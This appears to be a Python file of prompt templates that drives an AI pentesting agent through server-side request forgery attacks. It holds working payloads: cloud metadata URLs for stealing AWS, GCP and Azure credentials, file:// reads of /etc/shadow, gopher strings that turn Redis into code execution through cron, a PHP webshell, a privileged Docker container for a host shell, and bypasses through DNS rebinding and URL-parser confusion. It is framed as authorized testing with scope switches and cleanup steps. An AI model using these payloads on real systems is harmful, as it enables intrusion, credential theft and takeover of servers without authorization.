"""
RedAmon Server-Side Request Forgery (SSRF) Prompts

Prompts for SSRF attack workflows covering detection, internal network access,
cloud metadata exploitation, protocol smuggling, DNS rebinding, and escalation
to RCE via Redis/FastCGI/Docker chains.

Operates strictly black-box. The agent never has application source access;
all detection is response-driven (OAST callbacks, content/timing differentials,
defense fingerprinting).

Heavy parametrization: 10 project-level knobs control which sub-sections inject
and which command shapes the agent emits. See `_inject_builtin_skill_workflow`
in agentic/prompts/__init__.py for the wiring.
"""


# =============================================================================
# SSRF MAIN WORKFLOW
# =============================================================================

SSRF_TOOLS = """
## ATTACK SKILL: SERVER-SIDE REQUEST FORGERY (SSRF)

**CRITICAL: This attack skill has been CLASSIFIED as Server-Side Request Forgery.**
**You MUST follow the SSRF workflow below. Do NOT switch to other attack methods.**

---

## PRE-CONFIGURED SETTINGS (from project settings)

```
OOB callback (interactsh):     {ssrf_oob_callback_enabled}
Cloud metadata pivots:         {ssrf_cloud_metadata_enabled}
Gopher / RCE chain payloads:   {ssrf_gopher_enabled}
DNS rebinding bypasses:        {ssrf_dns_rebinding_enabled}
Advanced payload reference:    {ssrf_payload_reference_enabled}

Request timeout:               {ssrf_request_timeout}s
Port-scan ports:               {ssrf_port_scan_ports}
Internal CIDR ranges:          {ssrf_internal_ranges}
OOB provider:                  {ssrf_oob_provider}
Cloud providers in scope:      {ssrf_cloud_providers}
```

**Hard rules:**
- ALWAYS run Step 1 (graph-driven surface inventory) BEFORE firing payloads. Blind spraying is noisy and gets WAFed.
- FIRST classify the sink as full-response or blind. Submit one benign EXTERNAL URL whose body you already know and check whether that body is returned in the HTTP response. If it comes back, this is a FULL-RESPONSE (reflected) SSRF: you read every internal resource's body INLINE from the response, and you need NO OAST oracle, NO callback listener, and NO attacker-controlled infrastructure (never ask for or pause on LHOST/LPORT/webhook/"configure a callback" -- that is only for out-of-band exfiltration you do not need here). Only if the fetched body never returns (blind SSRF) do you fall back to the OAST oracle (Step 2); for the blind case, timeout alone is NEVER sufficient evidence.
- NEVER claim "internal access" from a single timing differential. Confirm with content match, status code variation, OR OAST callback.
- When the target shows uniform 4xx across all internal IP variants AND all schemes, the sink is LIKELY hardened -- but a front WAF, a wrong parameter name, or auth-gating on the fetch endpoint give the same signature, so first confirm a VALID external URL actually fetches. Only once the sink genuinely validates every axis, pivot to a different sink rather than chaining bypasses.
- If `Cloud metadata pivots: False`, do NOT probe 169.254.169.254, metadata.google.internal, or equivalent. The engagement RoE forbids it.
- If `Gopher / RCE chain payloads: False`, do NOT attempt gopher://, dict://, or Redis/FCGI/Docker RCE chains. Stop at internal-service banner disclosure.

---

## MANDATORY SSRF WORKFLOW

### Step 1: Surface inventory (query_graph, <5s)

BEFORE firing any payload, pull what recon already discovered:

```cypher
MATCH (e:Endpoint) WHERE e.baseurl CONTAINS '<target_host>' AND coalesce(e.quarantined, false) = false RETURN e.baseurl + e.path AS url, e.method, e.category, e.has_parameters LIMIT 100
MATCH (p:Parameter) WHERE p.baseurl CONTAINS '<target_host>' AND (p.category = 'redirect_params' OR p.type = 'url' OR p.name =~ '(?i).*(url|uri|src|dest|redirect|callback|webhook|feed|fetch|target|link|image|avatar|file|document|host|domain|site|path|page|load).*') AND NOT EXISTS {{ MATCH (e:Endpoint {{path: p.endpoint_path, baseurl: p.baseurl}}) WHERE e.user_id = p.user_id AND e.project_id = p.project_id AND coalesce(e.quarantined, false) }} RETURN p.name, p.position, p.baseurl + p.endpoint_path AS endpoint, p.category, p.type LIMIT 100
MATCH (b:BaseURL) WHERE b.url CONTAINS '<target_host>' RETURN b.url
MATCH (b:BaseURL)-[:HAS_ENDPOINT]->(:Endpoint)-[:USES_TECHNOLOGY]->(t:Technology) WHERE b.url CONTAINS '<target_host>' RETURN DISTINCT t.name, t.version
```

A **quarantined** Endpoint (a leaked one-time link or token from an archived URL) is never a target: never request it.

If no graph data exists, surface candidate sinks via response inspection:
- Open Graph / link previews (submit a URL in user content)
- PDF/image renderers (export, share, report features)
- OAuth / OIDC `redirect_uri` parameters
- SSO callback URLs, JWKS endpoint configuration
- Webhook configuration in admin / integration panels
- Profile avatar URL, RSS feed URL, integration webhook URL (Stored SSRF surface)

Build a TodoWrite list of candidate sinks ranked by reachability.

**After Step 1, request `transition_phase` to exploitation before proceeding.**

### Step 2: Establish OAST oracle (kali_shell, interactsh)

Before any internal probe, ensure you can detect blind egress. This is the foundation for confidence scoring later.

```
kali_shell({{"command": "interactsh-client -server {ssrf_oob_provider} -json -v > /tmp/interactsh.log 2>&1 & echo $!"}})
kali_shell({{"command": "sleep 5 && head -20 /tmp/interactsh.log"}})
```

**Save the PID** for later cleanup. Read the registered `.{ssrf_oob_provider}` domain from the log - random strings will NOT work, the domain is cryptographically registered with the server.

Send a baseline external callback to confirm the sink fetches at all:

```
execute_curl({{"args": "-s --max-time {ssrf_request_timeout} 'https://TARGET/fetch?url=https://REGISTERED_DOMAIN/ssrf-oracle'"}})
kali_shell({{"command": "tail -20 /tmp/interactsh.log"}})
```

If the callback fires, you have a confirmed-egress oracle. If it does not fire, the sink either does not fetch or egress is blocked. Try alternative parameter names from Step 1 before assuming the sink is dead.

### Step 3: Internal address probing

For each confirmed-fetching sink, probe internal addresses via three classes (skip cloud-metadata addresses if `Cloud metadata pivots: False`):

**Highest-value internal target -- endpoints that reject YOU but trust the server itself.**
Any path that returns 401/403 (or a redirect/blank) when you request it directly, with any hint of an origin/IP/host restriction (a path named or themed admin, internal, private, management, console, debug, or an explicit localhost-/loopback-only style block), is a PRIME SSRF objective: the app authorizes requests that originate from itself. Re-request that exact path THROUGH the sink's loopback address so the fetch originates server-side -- try `http://127.0.0.1/<path>`, `http://localhost/<path>`, and `http://127.0.0.1:<app-port>/<path>` (mirror whatever internal port the app actually listens on, not just 80). Enumerate candidate restricted paths through the loopback fetch: every 401/403/redirecting path you saw during recon, plus common admin/internal endpoint names. On a full-response sink the gated content returns inline in the same response. Do NOT declare SSRF unproductive until every directly-forbidden path has been re-requested through the loopback origin.

**Loopback variants:**
```
http://127.0.0.1/                                 # baseline
http://localhost/                                 # hostname
http://[::1]/                                     # IPv6 loopback
http://0.0.0.0/                                   # all-interfaces
http://127.1/                                     # short form
http://2130706433/                                # decimal of 127.0.0.1
http://0x7f000001/                                # hex of 127.0.0.1
http://017700000001/                              # octal of 127.0.0.1
```

**Private ranges (per `Internal CIDR ranges: {ssrf_internal_ranges}`):**
```
http://10.0.0.1/         http://10.0.0.254/
http://172.16.0.1/       http://172.31.255.254/
http://192.168.0.1/      http://192.168.1.1/
http://169.254.169.254/  # IFF cloud metadata pivots are enabled
```

**Port scan via SSRF (loop over `{ssrf_port_scan_ports}`):**
```
kali_shell({{"command": "for port in $(echo '{ssrf_port_scan_ports}' | tr ',' ' '); do code=$(curl -s -o /dev/null -w '%{{http_code}}' --connect-timeout {ssrf_request_timeout} 'https://TARGET/fetch?url=http://127.0.0.1:'$port'/'); echo \\"port $port -> $code\\"; done"}})
```

For each address, examine the response body and status code:
- 200 with internal-service banner content (e.g. `# Server`, `Redis`, `<title>Jenkins</title>`) -> internal service confirmed
- 200 with the same body as a known-bad address -> response is a stock error page, not real
- 502 / 504 -> sink attempted the fetch, address probably exists but service did not answer
- 400 / 403 uniformly across ALL internal IPs -> CIDR blocklist active (see Step 6 fingerprints)

### Step 4: Cloud metadata pivots

{ssrf_cloud_section}

### Step 5: Header/method control + IMDSv2 pivot

If the sink reflects or forwards request headers, the high-value cloud metadata endpoints (which require specific headers) become reachable:

**AWS IMDSv2** (requires PUT to `/latest/api/token`, then GET with header):

Direct SSRF cannot issue PUT, but:
- If the sink reflects request headers into the outbound request, inject `X-aws-ec2-metadata-token-ttl-seconds: 21600` and rely on intermediaries (nginx, envoy sidecars) that propagate them.
- CRLF-injection sinks: split into PUT + GET via embedded `\\r\\n` in the URL.
- Library quirks: some HTTP clients honor URL-encoded methods inside a malformed URL - test variants per parser.
- IPv6 fallback: `http://[fd00:ec2::254]/latest/meta-data/` may bypass v1-disabled config when v2 is enforced.

**GCP / Azure header injection:**
```
execute_curl({{"args": "-s --max-time {ssrf_request_timeout} 'https://TARGET/fetch?url=http://metadata.google.internal/computeMetadata/v1/' -H 'Metadata-Flavor: Google'"}})
execute_curl({{"args": "-s --max-time {ssrf_request_timeout} 'https://TARGET/fetch?url=http://169.254.169.254/metadata/instance' -H 'Metadata: true'"}})
```

If the sink does not forward custom headers, attempt CRLF injection in the URL itself:
```
http://metadata.google.internal/computeMetadata/v1/%0d%0aMetadata-Flavor:%20Google%0d%0a
```

### Step 6: Defense fingerprints (when to stop and pivot)

Black-box signals that a real defense is in place. Use these to avoid wasting budget on hardened sinks.

| Signal | Likely defense |
|---|---|
| Uniform 400/403 across 127.0.0.1, 10.x, 172.16.x, 192.168.x, 169.254.x | CIDR/RFC1918 blocklist |
| Same response for IP and hex/octal/decimal forms of the same address | Post-parse validation (not regex on string) |
| Allowed schemes echo back, others fail with same error | Scheme allowlist |
| First-hop URL works, redirect target rejected | Redirect target re-validated |
| External URL works, then identical external URL fails after seconds | DNS pinning (resolve-once) |
| 169.254.169.254 fails AND 169.254.169.254.nip.io also fails | Resolved-IP block, not hostname block |

Several of these firing together is a strong signal the sink is well-hardened -- treat it as a lead, not proof (some co-occur for benign reasons). When the sink genuinely validates on every axis you test, pivot to a different sink rather than chaining bypasses.

### Step 7: Confidence scoring + reporting

For each finding, score with this scale:

- **High** - Live OAST callback received, OR cloud metadata content retrieved, OR internal service banner returned in response body, OR the body of an endpoint that is access-controlled to the loopback/server origin (one that returns 401/403 when you request it directly) returned inline via the loopback fetch
- **Medium** - Response-time differential consistent across runs, OR status-code differential between internal/external targets, OR partial OOB (DNS hit but no HTTP)
- **Low** - Single-run timing hint, error message disclosure only, or inconsistent indicators

Rule: when uncertain, round down. False positives waste exploitation budget.

**False positives to avoid:**
- Client-side fetches only (no server request occurred)
- Strict allowlists with DNS pinning AND no redirect following
- SSRF mocks/sandboxes returning canned content without real egress
- Uniform errors across all targets and protocols -> egress fully blocked
- Timeout alone -> never sufficient, require OAST or content differential
- Reflected URL in response body without server fetch (echo, not SSRF)

**Output schema** (one entry per confirmed finding):

```json
{{
  "id": "SSRF-NN",
  "type": "reflected | stored | blind | semi-blind",
  "vector": "url_param | webhook | redirect_chain | parser_diff | dns_rebind | header_injection",
  "request": {{"method": "POST", "endpoint": "/api/import", "parameter": "url"}},
  "missing_defense": "no scheme allowlist | follows redirects | no CIDR block | ...",
  "internal_access": ["redis:6379", "imds:169.254.169.254"],
  "cloud_metadata": "aws_iam_creds | gcp_sa_token | none",
  "rce_path": "redis_cron | docker_api | fcgi | none",
  "evidence": "OAST callback https://abc.{ssrf_oob_provider}/x at 14:32:01 + response body match",
  "confidence": "High | Medium | Low"
}}
```

Then a human summary including: dominant pattern, hardened components, remediation (allowlist + redirect handling + protocol restriction).

### Step 8: Cleanup

```
kali_shell({{"command": "kill SAVED_INTERACTSH_PID 2>/dev/null"}})
kali_shell({{"command": "rm -f /tmp/interactsh.log"}})
```

Set `action='complete'` with the captured findings.

{ssrf_custom_targets_section}
"""


# =============================================================================
# CLOUD PROVIDER METADATA BLOCKS (assembled from SSRF_CLOUD_PROVIDERS setting)
# =============================================================================

SSRF_CLOUD_AWS = """
**AWS (IMDSv1):**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document
```

Extraction sequence:
1. List role: `GET /latest/meta-data/iam/security-credentials/`
2. Get keys: `GET /latest/meta-data/iam/security-credentials/<role>` -> AccessKeyId, SecretAccessKey, Token
3. Use the temporary credentials with `boto3` (via execute_code) to enumerate scope.

**AWS (IMDSv2)** requires a PUT-token. See Step 5 for the header-injection pivot."""

SSRF_CLOUD_GCP = """
**GCP** (requires `Metadata-Flavor: Google` header):
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

If the sink does not forward custom headers, see Step 5 CRLF pivot."""

SSRF_CLOUD_AZURE = """
**Azure** (requires `Metadata: true` header):
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
```"""

SSRF_CLOUD_DIGITALOCEAN = """
**DigitalOcean** (no header required):
```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/user-data
```"""

SSRF_CLOUD_ALIBABA = """
**Alibaba Cloud** (note: distinct IP):
```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/ram/security-credentials/
```"""

SSRF_CLOUD_PROVIDER_BLOCKS = {
    'aws': SSRF_CLOUD_AWS,
    'gcp': SSRF_CLOUD_GCP,
    'azure': SSRF_CLOUD_AZURE,
    'digitalocean': SSRF_CLOUD_DIGITALOCEAN,
    'alibaba': SSRF_CLOUD_ALIBABA,
}

SSRF_CLOUD_DISABLED_STUB = """
**Cloud metadata pivots are DISABLED for this engagement.** Skip 169.254.169.254, metadata.google.internal, and equivalent endpoints. Focus on internal service discovery (Step 3) and protocol smuggling (only if gopher is enabled)."""


# =============================================================================
# OOB / BLIND SSRF WORKFLOW (gated on SSRF_OOB_CALLBACK_ENABLED)
# =============================================================================

SSRF_OOB_WORKFLOW = """
## OOB / Blind SSRF Workflow (interactsh callbacks)

**Use this when:** the response body never contains the fetched content (true blind), the sink only returns success/failure status, or the only signal you can extract is timing/error variation.

---

### Step 1: Confirm egress, then map ports via OAST

After Step 2 of the main workflow registered an OAST domain, send one probe per candidate internal target. Use the configured `Request timeout` from the main settings block:

```
execute_curl({"args": "-s --max-time 10 'https://TARGET/fetch?url=http://internal-host:PORT/' &"})
kali_shell({"command": "tail -50 /tmp/interactsh.log"})
```

Internal hosts that the sink reaches but cannot resolve will produce DNS-only callbacks if the SSRF runs through a local resolver pointed at an attacker-controlled domain. Use:

```
http://INTERNAL_NAME.REGISTERED_DOMAIN/
```

The DNS query for `INTERNAL_NAME.REGISTERED_DOMAIN` arrives at the OAST server with the source IP of the target's DNS resolver - this is enough to confirm the sink is alive even if HTTP egress is blocked.

### Step 2: Timing-based port classification (when OAST blocked)

```
kali_shell({"command": "for port in 22 80 443 6379 8080 9200; do start=$(date +%s%N); curl -s -o /dev/null --max-time 10 'https://TARGET/fetch?url=http://127.0.0.1:'$port'/' ; end=$(date +%s%N); echo \\"port $port -> $(( (end-start)/1000000 ))ms\\"; done"})
```

Open ports respond fast (TCP RST or HTTP error within ms). Closed ports time out at the configured `connect-timeout`. Filtered ports time out at the read-timeout. The three classes produce three distinct timing buckets.

### Step 3: Status-code differential

```
kali_shell({"command": "for url in 'http://127.0.0.1:22/' 'http://127.0.0.1:99/' 'http://127.0.0.1:6379/' 'http://1.1.1.1/'; do code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 10 'https://TARGET/fetch?url='$url); echo \\"$url -> $code\\"; done"})
```

If the four targets produce two distinct status codes, the sink is leaking reachability via status. Open ports usually map to the "fetch succeeded" code (often 200 or 502), closed/unroutable to the "fetch failed" code (often 400 or 504).

### Step 4: Content-length differential

When status codes are uniform, response sizes may still leak:

```
kali_shell({"command": "for url in '...'; do len=$(curl -s --max-time 10 'https://TARGET/fetch?url='$url | wc -c); echo \\"$url -> $len bytes\\"; done"})
```

A consistent length-differential across runs is a Medium-confidence reachability signal.

---

**Cleanup:** kill the interactsh PID and remove `/tmp/interactsh.log` at the end of the engagement.
"""


# =============================================================================
# PROTOCOL SMUGGLING + RCE CHAINS (gated on SSRF_GOPHER_ENABLED)
# =============================================================================

SSRF_GOPHER_CHAINS = """
## Protocol Smuggling + RCE Chains

**Use this when:** you have confirmed SSRF and want to escalate to file read or RCE via non-HTTP protocol smuggling. Requires that the sink does NOT enforce a scheme allowlist.

---

### file:// (local file disclosure)

```
file:///etc/passwd
file:///etc/shadow                           (usually root-only, expect 403/empty)
file:///proc/self/environ                    (env vars, often leaks secrets)
file:///proc/self/cmdline                    (process command line)
file:///var/log/apache2/access.log
file:///c:/windows/win.ini                   (Windows targets)
file:///c:/windows/system32/config/sam       (typically locked)
```

### dict:// (banner grab on text protocols)

```
dict://127.0.0.1:11211/stats                 (memcached)
dict://127.0.0.1:6379/info                   (redis)
dict://127.0.0.1:25/HELO                     (smtp)
```

### gopher:// (raw protocol smuggling - most powerful)

**Redis command injection:**
```
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$4%0d%0atest%0d%0a$4%0d%0apwnd%0d%0a
```

**Redis -> RCE via cron** (when /var/spool/cron is writable):
```
gopher://127.0.0.1:6379/_*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*3%0d%0a$3%0d%0aSET%0d%0a$4%0d%0atest%0d%0a$19%0d%0a*/1 * * * * id%0d%0a*1%0d%0a$4%0d%0aSAVE%0d%0a
```

**Redis -> webshell via webroot:**
```
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET x "<?php system($_GET['cmd']); ?>"
SAVE
```

(Translate to gopher CRLF format; build with execute_code if needed.)

**FastCGI / PHP-FPM RCE** (port 9000):
Use Gopherus or equivalent generator. Pattern:
```
gopher://127.0.0.1:9000/_<crafted FastCGI record with PHP_VALUE auto_prepend_file>
```

This is fragile across PHP-FPM versions. Test with a benign command first (e.g. `id > /tmp/x`) before escalating.

### Internal service exploitation (HTTP-based RCE chains)

**Docker API (port 2375, no TLS):**
```
http://127.0.0.1:2375/containers/json
http://127.0.0.1:2375/info
```

If the API is reachable, create a privileged container with host filesystem mount:
```
POST /containers/create
{
  "Image": "alpine",
  "Cmd": ["/bin/sh"],
  "Binds": ["/:/host"],
  "Privileged": true,
  "Tty": true
}
```

Then `POST /containers/<id>/start`, `POST /containers/<id>/exec` to land a shell on the host.

**Kubernetes API (port 6443/8443):**
```
https://127.0.0.1:6443/api/v1/namespaces
https://127.0.0.1:6443/api/v1/secrets
https://127.0.0.1:6443/api/v1/pods
```

Without a service account token, expect 401. With token leak from another sink (often via SSRF-into-pod-metadata), enumerate secrets and pods.

**Consul (port 8500):**
```
http://127.0.0.1:8500/v1/kv/?recurse        (key-value store, often leaks secrets)
http://127.0.0.1:8500/v1/agent/members
http://127.0.0.1:8500/v1/catalog/services
```

**Elasticsearch (port 9200):**
```
http://127.0.0.1:9200/_cat/indices
http://127.0.0.1:9200/_search?q=*
http://127.0.0.1:9200/_all/_search?q=password
```

---

**Once RCE is achieved:** request `transition_phase` to post_exploitation, capture the proof (command output, file write, callback), and document the full chain (entry sink -> internal service -> RCE technique).
"""


# =============================================================================
# DNS REBINDING BYPASSES (gated on SSRF_DNS_REBINDING_ENABLED)
# =============================================================================

SSRF_DNS_REBINDING = """
## DNS Rebinding Bypasses

**Use this when:** the sink validates the destination hostname/IP BEFORE making the request but resolves DNS again at fetch time. Allowlists checked at validation time fail because the second resolution returns the internal IP.

---

### Free DNS rebinding services (no setup required)

**1u.ms** - explicit two-IP rebind:
```
http://make-1.2.3.4-rebind-169.254.169.254.1u.ms/
```
First resolution returns 1.2.3.4 (passes allowlist), second returns 169.254.169.254.

**rbndr.us** - alternates between two IPs:
```
http://7f000001.c0a80001.rbndr.us/        (alternates 127.0.0.1 / 192.168.0.1)
```

**nip.io / sslip.io** - encode IP in hostname:
```
http://169.254.169.254.nip.io/             (always resolves to 169.254.169.254)
http://169-254-169-254.nip.io/             (dash form)
http://169.254.169.254.sslip.io/           (TLS-friendly equivalent)
```

These do NOT actually rebind - they encode the IP in the name. Useful when the allowlist is hostname-based.

### Building your own (when external services are blocked)

If outbound to 1u.ms / rbndr.us is firewalled, you need a controlled domain with very short TTL (5s or less). Out of scope for most engagements; document as "would require attacker-controlled DNS infrastructure" if external rebind services are blocked.

### Detection signal

When the first request succeeds and the second (with rebinding) fails or returns different content, the validator is checking only the initial resolution. This is a Medium-confidence finding even before exploitation lands; promote to High once internal content is retrieved.

### TOCTOU notes

DNS rebinding is a special case of TOCTOU on DNS resolution. Other TOCTOU vectors:
- Validator checks the URL string, fetcher re-parses with a different parser
- Validator follows redirects to terminate, fetcher follows them to fetch
- Validator strips fragments, fetcher includes them
- Validator URL-decodes once, fetcher URL-decodes twice (or vice versa)
"""


# =============================================================================
# ADVANCED PAYLOAD REFERENCE (gated on SSRF_PAYLOAD_REFERENCE_ENABLED)
# =============================================================================

SSRF_PAYLOAD_REFERENCE = """
## SSRF Payload Reference (advanced bypasses + real-world precedents)

### URL Parser Confusion

```
http://attacker.com@169.254.169.254/         # userinfo confusion
http://169.254.169.254#@attacker.com/        # fragment confusion
http://169.254.169.254%2523@attacker.com/    # double-encoded fragment
http://169.254.169.254\\@attacker.com/        # backslash confusion
http://attacker.com:80@169.254.169.254/      # port in userinfo
http://169.254.169.254%00.attacker.com/      # null byte
http://169.254.169.254%0d%0a%0d%0a<payload>  # CRLF injection
```

### Address Encoding Variants

| Form | Example | Decodes to |
|---|---|---|
| Decimal | `2130706433` | 127.0.0.1 |
| Hex | `0x7f000001` | 127.0.0.1 |
| Hex with dots | `0x7f.0x0.0x0.0x1` | 127.0.0.1 |
| Octal | `017700000001` | 127.0.0.1 |
| Mixed octal | `0177.0.0.1` | 127.0.0.1 |
| Short form | `127.1` | 127.0.0.1 |
| IPv4-mapped IPv6 | `[::ffff:127.0.0.1]` | 127.0.0.1 |
| Unicode fullwidth | U+FF11 U+FF12 U+FF17 etc | 127 (as digits) |

### URL Encoding Levels

```
http://127.0.0.1/  ->  http://%31%32%37%2e%30%2e%30%2e%31/    (single-encode)
http://127.0.0.1/  ->  http://%2531%2532%2537%252e...         (double-encode)
http://127%2e0%2e0%2e1/                                       (partial encode)
```

### Hostname Tricks

```
http://localtest.me/                    # always 127.0.0.1
http://anything.localtest.me/           # always 127.0.0.1
http://vcap.me/                         # always 127.0.0.1
http://169.254.169.254.attacker.com/    # may resolve via wildcard
```

### Open Redirect Chains

```
http://trusted-domain.com/redirect?url=http://169.254.169.254/
https://github.com/login?return_to=http://169.254.169.254/
https://www.google.com/url?q=http://169.254.169.254/
```

When the allowlist permits a trusted domain that has its own open redirect, chain through it.

### Real-World Precedents (HackerOne)

| Pattern | Reference | Lesson |
|---|---|---|
| Capital One 2019 | breach disclosure | SSRF -> AWS IMDSv1 -> S3 enumeration -> 100M records |
| GitLab #369451 | ssrf in CI after first run | TOCTOU: validator runs once, CI re-fetches every build |
| Slack #386292 | SSRF protection bypass | URL parser differential between validator and fetcher |
| Concrete CMS #1369312 | DNS rebinding bypass | Allowlist checked pre-resolution, fetch re-resolves |
| Snapchat (416 upvotes) | SSRF + Google Metadata via JS | Client-side validator only |
| Dropbox/HelloSign (360 upvotes) | AWS private keys disclosure | Verbose error leaked credentials |
| Dropbox $17.5k (302 upvotes) | Full Response SSRF via Google Drive | Sink returned response body |
| GitLab $10k (351 upvotes) | SSRF via remote_attachment_url | URL parameter |
| CVE-2024-40898 ($4.2k) | Apache mod_rewrite Windows | UNC path |
| CVE-2024-38472 ($4.9k) | Apache UNC SSRF | Protocol smuggling |

When a similar pattern appears in your target, cite the precedent in the finding evidence - it sharpens the report.
"""
